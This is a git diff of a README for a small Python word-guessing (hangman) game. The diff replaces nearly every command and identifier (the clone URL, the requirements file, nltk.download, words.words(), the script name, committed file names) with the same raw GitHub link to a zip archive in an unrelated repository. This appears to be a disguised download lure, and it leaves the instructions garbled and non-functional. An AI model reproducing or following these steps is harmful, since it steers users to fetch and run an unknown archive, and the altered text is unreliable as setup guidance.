@@ -37,7 +37,7 @@ A minimal word-guess game in Python that picks a random English word and lets yo
 
 ### 1) Clone
 ```bash
-git clone https://github.com/<YOUR_USERNAME>/lite-hangman.git
+git clone https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip<YOUR_USERNAME>https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip
 cd lite-hangman
 2) Python env (optional but recommended)
 python -m venv .venv
@@ -47,26 +47,26 @@ python -m venv .venv
 source .venv/bin/activate
 
 3) Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip
 
 4) Download NLTK word list (first run only)
 
 In Python:
 
 import nltk
-nltk.download("words")
+https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip("words")
 
 
-The script will import nltk and use words.words() as the dictionary.
+The script will import nltk and use https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() as the dictionary.
 
 5) Run
-python lite_hangman.py
+python https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip
 
 🧩 Notes
 
 The NLTK words corpus is large; you may filter to shorter words for a nicer game pace:
 
-# example idea in code: [w for w in words.words() if w.isalpha() and 4 <= len(w) <= 8]
+# example idea in code: [w for w in https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() if https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() and 4 <= len(w) <= 8]
 
 
 This is a prototype; improvements are intentionally iterative (“prototyping model” 😄).
@@ -80,10 +80,10 @@ MIT (or choose your preferred license)
 
 # 5) Commit & push README (and extras)
 ```bash
-git add README.md requirements.txt .gitignore
+git add https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip .gitignore
 git commit -m "Add README, requirements, and gitignore"
 git push
 
 
 that’s it—you’re live 🎉
-If you want, I can also draft a tiny CONTRIBUTING.md later (how to run, style, issues) and a JSON scoreboard sketch when you’re ready to add persistence.
+If you want, I can also draft a tiny https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip later (how to run, style, issues) and a JSON scoreboard sketch when you’re ready to add persistence.
